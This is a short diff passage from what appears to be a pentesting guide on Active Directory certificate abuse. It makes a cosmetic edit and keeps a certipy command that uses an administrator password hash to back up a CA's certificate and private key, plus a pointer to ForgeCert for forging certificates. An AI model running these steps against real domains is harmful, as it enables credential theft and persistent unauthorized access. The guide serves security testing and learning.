@@ -34,7 +34,7 @@ You can also get the cert and private key using [**certipy**](https://github.com
 certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
 ```
 
-Once you have the **CA cert** with the private key in `.pfx` format you can use [**ForgeCert**](https://github.com/GhostPack/ForgeCert) **** to create valid certificates:
+Once you have the **CA cert** with the private key in `.pfx` format you can use [**ForgeCert**](https://github.com/GhostPack/ForgeCert)  to create valid certificates:
 
 ```bash
 # Create new certificate with ForgeCert
